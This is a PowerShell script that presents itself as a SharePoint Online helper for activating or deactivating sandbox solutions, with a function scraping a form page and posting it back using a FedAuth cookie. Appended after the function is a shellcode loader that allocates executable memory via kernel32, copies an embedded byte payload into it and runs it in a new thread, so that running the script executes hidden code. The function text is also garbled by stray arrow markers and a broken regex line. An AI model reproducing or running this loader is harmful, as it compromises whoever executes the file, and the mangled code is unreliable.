

 -||-> function Switch-SPOEnableDisableSolution
{
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory=$true, Position=1)]
	    [string]$solutionName,
		
		[Parameter(Mandatory=$true, Position=2)]
	    [bool]$activate
	)
	
	
	 -||-> $solutionId =  -||-> Get-SPOSolutionId -solutionName $solutionName <-||-  <-||- 

    
     -||-> $operation = "" <-||- 
	 -||-> if( -||-> $activate <-||- ) 
	{ 
		 -||-> $operation = "ACT" <-||-  
	} 
	else 
	{ 
		 -||-> $operation = "DEA" <-||-  
	} <-||- 
	
     -||-> $solutionPageUrl =  -||-> Join-SPOParts -Separator '/' -Parts $clientContext.Site.Url, "/_catalogs/solutions/forms/activate.aspx?Op=$operation&ID=$solutionId" <-||-  <-||- 
	
	 -||-> $cookieContainer =  -||-> New-Object System.Net.CookieContainer <-||-  <-||- 
    
	 -||-> $request = $clientContext.WebRequestExecutorFactory.CreateWebRequestExecutor($clientContext, $solutionPageUrl).WebRequest <-||- 
	
	 -||-> if ( -||-> $clientContext.Credentials -ne $null <-||- )
	{
		 -||-> $authCookieValue = $clientContext.Credentials.GetAuthenticationCookie($clientContext.Url) <-||- 
	    
	  	 -||-> $fedAuth =  -||-> new-object System.Net.Cookie <-||-  <-||- 
		 -||-> $fedAuth.Name = "FedAuth" <-||- 
	  	 -||-> $fedAuth.Value = $authCookieValue.TrimStart("SPOIDCRL=") <-||- 
	  	 -||-> $fedAuth.Path = "/" <-||- 
	  	 -||-> $fedAuth.Secure = $true <-||- 
	  	 -||-> $fedAuth.HttpOnly = $true <-||- 
	  	 -||-> $fedAuth.Domain = ( -||-> New-Object System.Uri( -||-> $clientContext.Url <-||- ) <-||- ).Host <-||- 
	  	
		
		 -||-> $cookieContainer.Add($fedAuth) <-||- 
		
		 -||-> $request.CookieContainer = $cookieContainer <-||- 
	}
	else
	{
		
		 -||-> $request.UseDefaultCredentials = $true <-||- 
	} <-||- 
	
	 -||-> $request.ContentLength = 0 <-||- 
	
	 -||-> $response = $request.GetResponse() <-||- 
	
		
		 -||-> $strResponse = $null <-||- 
		 -||-> $stream = $response.GetResponseStream() <-||- 
		 -||-> if ( -||-> -not( -||-> [String]::IsNullOrEmpty($response.Headers["Content-Encoding"]) <-||- ) <-||- )
		{
        	 -||-> if ( -||-> $response.Headers["Content-Encoding"].ToLower().Contains("gzip") <-||- )
			{
                 -||-> $stream =  -||-> New-Object System.IO.Compression.GZipStream( -||-> $stream, [System.IO.Compression.CompressionMode]::Decompress <-||- ) <-||-  <-||- 
			}
			elseif ( -||-> $response.Headers["Content-Encoding"].ToLower().Contains("deflate") <-||- )
			{
                 -||-> $stream =  -||-> new-Object System.IO.Compression.DeflateStream( -||-> $stream, [System.IO.Compression.CompressionMode]::Decompress <-||- ) <-||-  <-||- 
			} <-||- 
		} <-||- 
		
		
         -||-> $sr =  -||-> New-Object System.IO.StreamReader( -||-> $stream <-||- ) <-||-  <-||- 

			 -||-> $strResponse = $sr.ReadToEnd() <-||- 
            
		 -||-> $sr.Close() <-||- 
		 -||-> $sr.Dispose() <-||- 
        
         -||-> $stream.Close() <-||- 
		
         -||-> $inputMatches =  -||-> $strResponse | Select-String -AllMatches -Pattern "<input.+?\/??>" | select -Expand Matches <-||-  <-||- 
		
		 -||-> $inputs = @{} <-||- 
		
		
         -||-> foreach ($match in  -||-> $inputMatches <-||- )
        {
			 -||-> if ( -||-> -not( -||-> $match[0] -imatch "name=\""(.+?)\""" <-||- ) <-||- )
			{
				continue
			} <-||- 
			 -||-> $name = $matches[1] <-||- 
			
			 -||-> if( -||-> -not( -||-> $match[0] -imatch "value=\""(.+?)\""" <-||- ) <-||- )
			{
				continue
			} <-||- 
			 -||-> $value = $matches[1] <-||- 

             -||-> $inputs.Add($name, $value) <-||- 
        } <-||- 

        
         -||-> $searchString = "" <-||- 
		 -||-> if ( -||-> $activate <-||- ) 
		{
			 -||-> $searchString = "ActivateSolutionItem" <-||- 
		}
		else
		{
			 -||-> $searchString = "DeactivateSolutionItem" <-||- 
		} <-||- 
        
		 -||-> $match = $strResponse -imatch "__doPostBack\(\&\
		$inputs.Add(" -||-> _ <-||- __EVENTTARGET", $Matches[1])
	
	$response.Close()
	$response.Dispose()
	
	
    $strPost = ""
    foreach ($inputKey in $inputs.Keys)
	{
        if (-not([String]::IsNullOrEmpty($inputKey)) -and -not($inputKey.EndsWith("iidIOGoBack")))
		{
            $strPost += [System.Uri]::EscapeDataString($inputKey) + "=" + [System.Uri]::EscapeDataString($inputs[$inputKey]) + " <-||- & -||-> "
		}
	}
	$strPost = $strPost.TrimEnd(" <-||- & -||-> ")
	
    $postData = [System.Text.Encoding]::UTF8.GetBytes($strPost);

    
    $activateRequest = $clientContext.WebRequestExecutorFactory.CreateWebRequestExecutor($clientContext, $solutionPageUrl).WebRequest
    $activateRequest.Method = " -||-> P <-||- POST"
    $activateRequest.Accept = "text/html, application/xhtml+xml, */*"
    if ($clientContext.Credentials -ne $null)
	{
		$activateRequest.CookieContainer = $cookieContainer
	}
	else
	{
		
		$activateRequest.UseDefaultCredentials = $true
	}
    $activateRequest.ContentType = "application/x-www-form-urlencoded"
    $activateRequest.ContentLength = $postData.Length
    $activateRequest.UserAgent = "Mozilla/5.0 ( -||-> compatible <-||-  <-||- ;  -||-> MSIE 9.0 <-||- ;  -||-> Windows NT 6.1 <-||- ;  -||-> WOW64 <-||- ;  -||-> Trident/5.0 <-||-  <-||- ) -||-> ";
    $activateRequest.Headers[" -||-> C <-||- Cache-Control"] = "no-cache";
    $activateRequest.Headers["Accept-Encoding"] = "gzip, deflate";
    $activateRequest.Headers["Accept-Language"] = "fr-FR,en-US";

    
    $stream = $activateRequest.GetRequestStream()
        $stream.Write($postData, 0, $postData.Length)
        $stream.Close();
	$stream.Dispose()
	
    
    $response = $activateRequest.GetResponse()
	$response.Close()
	$response.Dispose()
	
}

$1QYF = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $1QYF -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x87,0xf6,0x2b,0x7f,0xd9,0xf7,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x4f,0x31,0x56,0x13,0x03,0x56,0x13,0x83,0xee,0x7b,0x14,0xde,0x83,0x6b,0x5b,0x21,0x7c,0x6b,0x3c,0xab,0x99,0x5a,0x7c,0xcf,0xea,0xcc,0x4c,0x9b,0xbf,0xe0,0x27,0xc9,0x2b,0x73,0x45,0xc6,0x5c,0x34,0xe0,0x30,0x52,0xc5,0x59,0x00,0xf5,0x45,0xa0,0x55,0xd5,0x74,0x6b,0xa8,0x14,0xb1,0x96,0x41,0x44,0x6a,0xdc,0xf4,0x79,0x1f,0xa8,0xc4,0xf2,0x53,0x3c,0x4d,0xe6,0x23,0x3f,0x7c,0xb9,0x38,0x66,0x5e,0x3b,0xed,0x12,0xd7,0x23,0xf2,0x1f,0xa1,0xd8,0xc0,0xd4,0x30,0x09,0x19,0x14,0x9e,0x74,0x96,0xe7,0xde,0xb1,0x10,0x18,0x95,0xcb,0x63,0xa5,0xae,0x0f,0x1e,0x71,0x3a,0x94,0xb8,0xf2,0x9c,0x70,0x39,0xd6,0x7b,0xf2,0x35,0x93,0x08,0x5c,0x59,0x22,0xdc,0xd6,0x65,0xaf,0xe3,0x38,0xec,0xeb,0xc7,0x9c,0xb5,0xa8,0x66,0x84,0x13,0x1e,0x96,0xd6,0xfc,0xff,0x32,0x9c,0x10,0xeb,0x4e,0xff,0x7c,0xd8,0x62,0x00,0x7c,0x76,0xf4,0x73,0x4e,0xd9,0xae,0x1b,0xe2,0x92,0x68,0xdb,0x05,0x89,0xcd,0x73,0xf8,0x32,0x2e,0x5d,0x3e,0x66,0x7e,0xf5,0x97,0x07,0x15,0x05,0x18,0xd2,0xba,0x55,0xb6,0x8d,0x7a,0x06,0x76,0x7e,0x13,0x4c,0x79,0xa1,0x03,0x6f,0x50,0xca,0x2c,0x85,0x5a,0xf5,0xac,0xc2,0x3b,0x87,0xc7,0x69,0xd4,0x03,0x7d,0x40,0x4e,0xb9,0x1e,0xf7,0xea,0x2f,0x92,0x29,0x9d,0xdd,0x33,0x36,0x09,0x8b,0x94,0x02,0x49,0x34,0x31,0xe1,0x09,0xd7,0xd0,0xf3,0xd9,0x8f,0x26,0xfc,0xd8,0xf4,0xae,0x1a,0xb0,0x1a,0xe7,0xb5,0x2c,0x82,0xa2,0x4e,0xcd,0x4b,0x79,0x2b,0xcd,0xc0,0x8e,0xcb,0x83,0x20,0xfa,0xdf,0x73,0xc1,0xb1,0x82,0xd5,0xde,0x6f,0xa8,0xd9,0x4a,0x94,0x7b,0x8e,0xe2,0x96,0x5a,0xf8,0xac,0x69,0x89,0x73,0x64,0xfc,0x72,0xeb,0x89,0x10,0x73,0xeb,0xdf,0x7a,0x73,0x83,0x87,0xde,0x20,0xb6,0xc7,0xca,0x54,0x6b,0x52,0xf5,0x0c,0xd8,0xf5,0x9d,0xb2,0x07,0x31,0x02,0x4c,0x62,0xc3,0x7e,0x9b,0x4a,0xb1,0x6e,0x1f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$aMN=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($aMN.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$aMN,0,0,0);for (;;){Start-sleep 60};


 <-||- 
